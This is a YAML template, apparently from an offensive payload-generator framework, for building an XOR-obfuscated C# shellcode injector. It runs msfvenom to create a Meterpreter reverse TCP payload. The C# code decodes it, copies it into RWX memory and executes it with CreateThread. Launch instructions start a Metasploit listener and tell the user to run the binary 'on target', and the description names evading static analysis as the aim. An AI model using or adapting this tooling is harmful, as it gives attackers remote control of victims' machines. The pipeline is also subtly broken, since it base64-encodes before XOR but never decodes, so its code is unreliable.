versions:
  - version: 1
    comment: "Initial version"
    timestamp: "2026-02-17T00:00:00"
    original:
      meta:
        name: "XOR-Encoded Shellcode Injector (Simple)"
        category: "Process Injection"
        description: |
          Simple XOR-encoded shellcode injector using C#.
          Uses single-byte XOR key (0xfa) for basic obfuscation.
          Similar to the classic XorCoder pattern.

          This is a simpler alternative to AES encryption, useful for
          evading basic static analysis while maintaining simplicity.

        effectiveness: "medium"

        mitre:
          tactic: "TA0005 - Defense Evasion"
          technique: "T1027 - Obfuscated Files or Information"

        artifacts:
          - "XOR-encoded shellcode in binary"
          - "Simple decode loop in code"
          - "VirtualAlloc and CreateThread API calls"

      parameters:
        - name: "lhost"
          type: "ip"
          description: "Listener IP address"
          required: true

        - name: "lport"
          type: "port"
          description: "Listener port"
          required: true
          default: 4444

        - name: "xor_key"
          type: "hex"
          description: "XOR key (single byte, e.g., 'fa')"
          required: false
          default: "fa"

        - name: "output_file"
          type: "string"
          description: "Output executable filename"
          required: true
          default: "xor_injector.exe"

        - name: "output_path"
          type: "path"
          description: "Output directory"
          required: true
          default: "{config.output_dir}"

      preprocessing:
        - type: "command"
          name: "generate_shellcode"
          command: |
            msfvenom -p windows/x64/meterpreter_reverse_tcp \
              LHOST={{ lhost }} LPORT={{ lport }} \
              EXITFUNC=thread -f raw
          output_var: "raw_shellcode"

        - type: "script"
          name: "encode_b64"
          script: "base64_encode.py"
          args:
            data: "{{ raw_shellcode }}"
          output_var: "shellcode_b64"

        - type: "script"
          name: "xor_encryption"
          script: "xor_encrypt.py"
          args:
            data: "{{ shellcode_b64 }}"
            key: "{{ xor_key }}"
          output_var: "xor_result"

        - type: "script"
          name: "format_payload"
          script: "format_csharp.py"
          args:
            data: "{{ xor_result.encrypted }}"
            var_name: "buf"
            bytes_per_line: 15
          output_var: "csharp_payload"

      output:
        type: "template"
        template_ext: ".cs"
        template: |
          using System;
          using System.Runtime.InteropServices;

          namespace XorInjector
          {
              public class Program
              {
                  // P/Invoke declarations
                  [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
                  static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

                  [DllImport("kernel32.dll")]
                  static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

                  [DllImport("kernel32.dll")]
                  static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

                  const uint MEM_COMMIT = 0x00001000;
                  const uint PAGE_EXECUTE_READWRITE = 0x40;

                  public static void Main(string[] args)
                  {
                      // XOR-encoded shellcode (key: 0xfa)
                      {{ csharp_payload | indent(12) }}

                      Console.WriteLine($"[*] Encoded payload size: {buf.Length} bytes");

                      // Decode the XOR payload (key: 0xfa)
                      for (int i = 0; i < buf.Length; i++)
                      {
                          buf[i] = (byte)((uint)buf[i] ^ 0x{{ xor_key }});
                      }

                      Console.WriteLine("[+] Payload decoded successfully");

                      // Allocate RWX memory
                      IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                      if (addr == IntPtr.Zero)
                      {
                          Console.WriteLine("[-] Failed to allocate memory!");
                          return;
                      }
                      Console.WriteLine($"[+] Allocated memory at: 0x{addr.ToInt64():X}");

                      // Copy shellcode to allocated memory
                      Marshal.Copy(buf, 0, addr, buf.Length);
                      Console.WriteLine("[+] Shellcode copied to memory");

                      // Execute shellcode
                      IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
                      if (hThread == IntPtr.Zero)
                      {
                          Console.WriteLine("[-] Failed to create thread!");
                          return;
                      }

                      Console.WriteLine("[+] Shellcode thread created!");
                      Console.WriteLine("[+] Executing payload...");

                      // Wait for thread to complete
                      WaitForSingleObject(hThread, 0xFFFFFFFF);
                  }
              }
          }

        compile:
          enabled: true
          command: "mcs -out:{{ output_path }}/{{ output_file }} -platform:x64 -unsafe {{ source_file }}"

        launch_instructions: |
          # Start Metasploit listener
          msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter_reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; exploit"

          # Execute on target
          {{ output_file }}

          # Note: Payload is XOR-encoded with key 0x{{ xor_key }}
